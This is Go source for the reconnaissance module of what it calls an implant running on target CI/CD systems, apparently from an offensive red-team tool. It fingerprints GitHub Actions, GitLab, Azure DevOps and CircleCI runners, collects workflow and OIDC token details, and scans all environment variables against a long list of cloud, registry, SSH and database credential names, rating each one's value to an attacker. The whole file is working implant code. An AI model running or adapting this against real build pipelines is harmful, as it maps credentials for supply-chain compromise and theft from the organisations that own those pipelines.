// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package brisket implements the implant/agent that runs on target systems.
package brisket

import (
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

// Recon performs full CI environment reconnaissance.
func (a *Agent) Recon() *models.ReconResult {
	start := time.Now()
	result := models.NewReconResult(a.agentID)

	result.Platform = detectPlatform()

	switch result.Platform {
	case models.PlatformGitHubActions:
		a.reconGitHub(result)
	case models.PlatformGitLabCI:
		a.reconGitLab(result)
	case models.PlatformAzureDevOps:
		a.reconAzure(result)
	case models.PlatformCircleCI:
		a.reconCircleCI(result)
	default:
		a.reconGeneric(result)
	}

	result.Runner = a.gatherRunnerInfo()
	a.detectSecrets(result)
	result.Network = a.checkNetwork()
	result.Environment = getFilteredEnv()

	result.Duration = float64(time.Since(start).Milliseconds())
	return result
}

// detectPlatform identifies which CI/CD platform we're running on.
func detectPlatform() models.CIPlatform {
	// GitHub Actions
	if os.Getenv("GITHUB_ACTIONS") == "true" {
		return models.PlatformGitHubActions
	}

	// GitLab CI
	if os.Getenv("GITLAB_CI") == "true" {
		return models.PlatformGitLabCI
	}

	// Azure DevOps
	if os.Getenv("TF_BUILD") == "True" {
		return models.PlatformAzureDevOps
	}

	// CircleCI
	if os.Getenv("CIRCLECI") == "true" {
		return models.PlatformCircleCI
	}

	// Jenkins
	if os.Getenv("JENKINS_URL") != "" {
		return models.PlatformJenkins
	}

	// Bitbucket Pipelines
	if os.Getenv("BITBUCKET_BUILD_NUMBER") != "" {
		return models.PlatformBitbucket
	}

	return models.PlatformUnknown
}

// reconGitHub gathers GitHub Actions specific information.
func (a *Agent) reconGitHub(result *models.ReconResult) {
	if repo := os.Getenv("GITHUB_REPOSITORY"); repo != "" {
		parts := strings.SplitN(repo, "/", 2)
		owner := ""
		name := repo
		if len(parts) == 2 {
			owner = parts[0]
			name = parts[1]
		}

		result.Repository = &models.RepoInfo{
			FullName:      repo,
			Owner:         owner,
			Name:          name,
			Platform:      models.PlatformGitHubActions,
			DefaultBranch: os.Getenv("GITHUB_REF_NAME"),
		}
	}

	result.Workflow = &models.WorkflowInfo{
		Name:      os.Getenv("GITHUB_WORKFLOW"),
		Path:      os.Getenv("GITHUB_WORKFLOW_REF"),
		RunID:     os.Getenv("GITHUB_RUN_ID"),
		RunNumber: os.Getenv("GITHUB_RUN_NUMBER"),
		Job:       os.Getenv("GITHUB_JOB"),
		Actor:     os.Getenv("GITHUB_ACTOR"),
		Event:     os.Getenv("GITHUB_EVENT_NAME"),
		Ref:       os.Getenv("GITHUB_REF"),
		SHA:       os.Getenv("GITHUB_SHA"),
	}

	result.OIDC = &models.OIDCInfo{
		Available:    os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL") != "",
		TokenURL:     os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL"),
		RequestToken: redactToken(os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")),
	}

	result.TokenPermissions = extractGitHubPermissions()
}

// reconGitLab gathers GitLab CI specific information.
func (a *Agent) reconGitLab(result *models.ReconResult) {
	if path := os.Getenv("CI_PROJECT_PATH"); path != "" {
		parts := strings.SplitN(path, "/", 2)
		owner := ""
		name := path
		if len(parts) == 2 {
			owner = parts[0]
			name = parts[1]
		}

		result.Repository = &models.RepoInfo{
			FullName:      path,
			Owner:         owner,
			Name:          name,
			Platform:      models.PlatformGitLabCI,
			DefaultBranch: os.Getenv("CI_DEFAULT_BRANCH"),
		}
	}

	result.Workflow = &models.WorkflowInfo{
		Name:  os.Getenv("CI_PIPELINE_NAME"),
		RunID: os.Getenv("CI_PIPELINE_ID"),
		Job:   os.Getenv("CI_JOB_NAME"),
		Actor: os.Getenv("GITLAB_USER_LOGIN"),
		Ref:   os.Getenv("CI_COMMIT_REF_NAME"),
		SHA:   os.Getenv("CI_COMMIT_SHA"),
	}

	result.OIDC = &models.OIDCInfo{
		Available:    os.Getenv("CI_JOB_JWT") != "" || os.Getenv("CI_JOB_JWT_V2") != "",
		RequestToken: redactToken(os.Getenv("CI_JOB_JWT_V2")),
	}
}

// reconAzure gathers Azure DevOps specific information.
func (a *Agent) reconAzure(result *models.ReconResult) {
	repo := os.Getenv("BUILD_REPOSITORY_NAME")
	result.Repository = &models.RepoInfo{
		FullName:      repo,
		Name:          repo,
		Platform:      models.PlatformAzureDevOps,
		DefaultBranch: os.Getenv("BUILD_SOURCEBRANCH"),
	}

	result.Workflow = &models.WorkflowInfo{
		Name:      os.Getenv("BUILD_DEFINITIONNAME"),
		RunID:     os.Getenv("BUILD_BUILDID"),
		RunNumber: os.Getenv("BUILD_BUILDNUMBER"),
		Actor:     os.Getenv("BUILD_REQUESTEDFOR"),
		Ref:       os.Getenv("BUILD_SOURCEBRANCH"),
		SHA:       os.Getenv("BUILD_SOURCEVERSION"),
	}

	result.OIDC = &models.OIDCInfo{
		Available: os.Getenv("SYSTEM_OIDCREQUESTURI") != "",
		TokenURL:  os.Getenv("SYSTEM_OIDCREQUESTURI"),
	}
}

// reconCircleCI gathers CircleCI specific information.
func (a *Agent) reconCircleCI(result *models.ReconResult) {
	result.Repository = &models.RepoInfo{
		FullName:      os.Getenv("CIRCLE_PROJECT_REPONAME"),
		Owner:         os.Getenv("CIRCLE_PROJECT_USERNAME"),
		Name:          os.Getenv("CIRCLE_PROJECT_REPONAME"),
		Platform:      models.PlatformCircleCI,
		DefaultBranch: os.Getenv("CIRCLE_BRANCH"),
	}

	result.Workflow = &models.WorkflowInfo{
		Name:  os.Getenv("CIRCLE_WORKFLOW_ID"),
		RunID: os.Getenv("CIRCLE_BUILD_NUM"),
		Job:   os.Getenv("CIRCLE_JOB"),
		Actor: os.Getenv("CIRCLE_USERNAME"),
		Ref:   os.Getenv("CIRCLE_BRANCH"),
		SHA:   os.Getenv("CIRCLE_SHA1"),
	}

	result.OIDC = &models.OIDCInfo{
		Available:    os.Getenv("CIRCLE_OIDC_TOKEN") != "",
		RequestToken: redactToken(os.Getenv("CIRCLE_OIDC_TOKEN")),
	}
}

// reconGeneric gathers information when platform is unknown.
func (a *Agent) reconGeneric(result *models.ReconResult) {
	result.Workflow = &models.WorkflowInfo{
		Job: os.Getenv("JOB_NAME"),
	}

	ciVars := []string{"CI", "CONTINUOUS_INTEGRATION", "BUILD_NUMBER"}
	for _, v := range ciVars {
		if os.Getenv(v) != "" {
			result.AddError("Detected CI environment but couldn't identify platform")
			break
		}
	}
}

// gatherRunnerInfo collects information about the runner environment.
func (a *Agent) gatherRunnerInfo() *models.RunnerInfo {
	info := &models.RunnerInfo{
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Hostname:  a.hostname,
		Workspace: os.Getenv("GITHUB_WORKSPACE"),
		TempDir:   os.Getenv("RUNNER_TEMP"),
		ToolCache: os.Getenv("RUNNER_TOOL_CACHE"),
	}

	if name := os.Getenv("RUNNER_NAME"); name != "" {
		info.Name = name
	}

	if labels := os.Getenv("RUNNER_LABELS"); labels != "" {
		info.SelfHosted = !strings.Contains(labels, "ubuntu-latest") &&
			!strings.Contains(labels, "windows-latest") &&
			!strings.Contains(labels, "macos-latest")
	}

	info.Container = isRunningInContainer()

	return info
}

// detectSecrets scans environment for secrets and tokens.
func (a *Agent) detectSecrets(result *models.ReconResult) {
	secretPatterns := map[string]struct {
		Type      models.SecretType
		HighValue bool
	}{
		// AWS
		"AWS_ACCESS_KEY_ID":     {models.SecretTypeAWS, true},
		"AWS_SECRET_ACCESS_KEY": {models.SecretTypeAWS, true},
		"AWS_SESSION_TOKEN":     {models.SecretTypeAWS, true},

		// GCP
		"GOOGLE_APPLICATION_CREDENTIALS": {models.SecretTypeGCP, true},
		"GCP_SERVICE_ACCOUNT":            {models.SecretTypeGCP, true},
		"GCLOUD_SERVICE_KEY":             {models.SecretTypeGCP, true},

		// Azure
		"AZURE_CREDENTIALS":    {models.SecretTypeAzure, true},
		"AZURE_CLIENT_SECRET":  {models.SecretTypeAzure, true},
		"ARM_CLIENT_SECRET":    {models.SecretTypeAzure, true},
		"AZURE_DEVOPS_EXT_PAT": {models.SecretTypeAzure, true},

		// GitHub
		"GITHUB_TOKEN": {models.SecretTypeGitHub, true},
		"GH_TOKEN":     {models.SecretTypeGitHub, true},
		"GITHUB_PAT":   {models.SecretTypeGitHub, true},
		"GH_PAT":       {models.SecretTypeGitHub, true},

		// NPM
		"NPM_TOKEN":       {models.SecretTypeNPM, true},
		"NODE_AUTH_TOKEN": {models.SecretTypeNPM, true},
		"NPM_AUTH_TOKEN":  {models.SecretTypeNPM, true},

		// Docker
		"DOCKER_PASSWORD":     {models.SecretTypeDocker, true},
		"DOCKER_HUB_PASSWORD": {models.SecretTypeDocker, true},
		"DOCKERHUB_TOKEN":     {models.SecretTypeDocker, true},

		// SSH
		"SSH_PRIVATE_KEY": {models.SecretTypeSSH, true},
		"DEPLOY_KEY":      {models.SecretTypeSSH, true},

		// Database
		"DATABASE_URL":      {models.SecretTypeDatabase, false},
		"POSTGRES_PASSWORD": {models.SecretTypeDatabase, false},
		"MYSQL_PASSWORD":    {models.SecretTypeDatabase, false},
		"MONGODB_URI":       {models.SecretTypeDatabase, false},

		// GitLab
		"CI_JOB_TOKEN":         {models.SecretTypeGitHub, true},
		"CI_REGISTRY_PASSWORD": {models.SecretTypeDocker, true},

		// Generic API keys
		"API_KEY":       {models.SecretTypeAPI, false},
		"API_SECRET":    {models.SecretTypeAPI, false},
		"SECRET_KEY":    {models.SecretTypeAPI, false},
		"SLACK_TOKEN":   {models.SecretTypeAPI, false},
		"SLACK_WEBHOOK": {models.SecretTypeAPI, false},
		"SONAR_TOKEN":   {models.SecretTypeAPI, false},
		"CODECOV_TOKEN": {models.SecretTypeAPI, false},
		"SNYK_TOKEN":    {models.SecretTypeAPI, true},
	}

	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := parts[0]
		value := parts[1]

		if value == "" {
			continue
		}

		if pattern, ok := secretPatterns[key]; ok {
			result.AddSecret(key, pattern.Type, len(value), pattern.HighValue)
			continue
		}

		upperKey := strings.ToUpper(key)
		if containsSecretKeyword(upperKey) && len(value) > 8 {
			secretType := classifySecretByName(upperKey)
			highValue := strings.Contains(upperKey, "AWS") ||
				strings.Contains(upperKey, "GCP") ||
				strings.Contains(upperKey, "AZURE") ||
				strings.Contains(upperKey, "PRIVATE")
			result.AddSecret(key, secretType, len(value), highValue)
		}
	}
}

// containsSecretKeyword checks if variable name suggests it's a secret.
func containsSecretKeyword(name string) bool {
	keywords := []string{
		"SECRET", "PASSWORD", "TOKEN", "KEY", "CREDENTIAL",
		"API_KEY", "APIKEY", "AUTH", "PRIVATE", "CERT",
	}
	for _, kw := range keywords {
		if strings.Contains(name, kw) {
			return true
		}
	}
	return false
}

// classifySecretByName attempts to classify a secret based on its name.
func classifySecretByName(name string) models.SecretType {
	switch {
	case strings.Contains(name, "AWS"):
		return models.SecretTypeAWS
	case strings.Contains(name, "GCP") || strings.Contains(name, "GOOGLE"):
		return models.SecretTypeGCP
	case strings.Contains(name, "AZURE") || strings.Contains(name, "ARM"):
		return models.SecretTypeAzure
	case strings.Contains(name, "GITHUB") || strings.Contains(name, "GH_"):
		return models.SecretTypeGitHub
	case strings.Contains(name, "NPM") || strings.Contains(name, "NODE"):
		return models.SecretTypeNPM
	case strings.Contains(name, "DOCKER"):
		return models.SecretTypeDocker
	case strings.Contains(name, "SSH") || strings.Contains(name, "DEPLOY"):
		return models.SecretTypeSSH
	case strings.Contains(name, "DATABASE") || strings.Contains(name, "DB_") ||
		strings.Contains(name, "POSTGRES") || strings.Contains(name, "MYSQL"):
		return models.SecretTypeDatabase
	default:
		return models.SecretTypeGeneric
	}
}

// checkNetwork checks network capabilities.
func (a *Agent) checkNetwork() *models.NetworkInfo {
	info := &models.NetworkInfo{
		Interfaces: []string{},
	}

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
				info.Interfaces = append(info.Interfaces, iface.Name)
			}
		}
	}

	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Head("https://api.github.com")
	if err == nil {
		resp.Body.Close()
		info.CanReachInternet = true
	}

	info.ProxyConfigured = os.Getenv("HTTP_PROXY") != "" ||
		os.Getenv("HTTPS_PROXY") != "" ||
		os.Getenv("http_proxy") != "" ||
		os.Getenv("https_proxy") != ""

	return info
}

// extractGitHubPermissions extracts GITHUB_TOKEN permissions from environment.
func extractGitHubPermissions() map[string]string {
	perms := make(map[string]string)

	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := parts[0]

		if strings.HasPrefix(key, "GITHUB_") && strings.Contains(key, "_PERMISSION") {
			permName := strings.TrimPrefix(key, "GITHUB_")
			permName = strings.TrimSuffix(permName, "_PERMISSION")
			perms[strings.ToLower(permName)] = parts[1]
		}
	}

	return perms
}

// isRunningInContainer checks if we're running inside a container.
func isRunningInContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}

	data, err := os.ReadFile("/proc/1/cgroup")
	if err == nil {
		content := string(data)
		if strings.Contains(content, "docker") ||
			strings.Contains(content, "kubepods") ||
			strings.Contains(content, "containerd") {
			return true
		}
	}

	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		return true
	}

	return false
}

// redactToken returns a redacted version of a token for logging.
func redactToken(token string) string {
	if token == "" {
		return ""
	}
	if len(token) <= 8 {
		return "•••"
	}
	return token[:4] + "•••" + token[len(token)-4:]
}
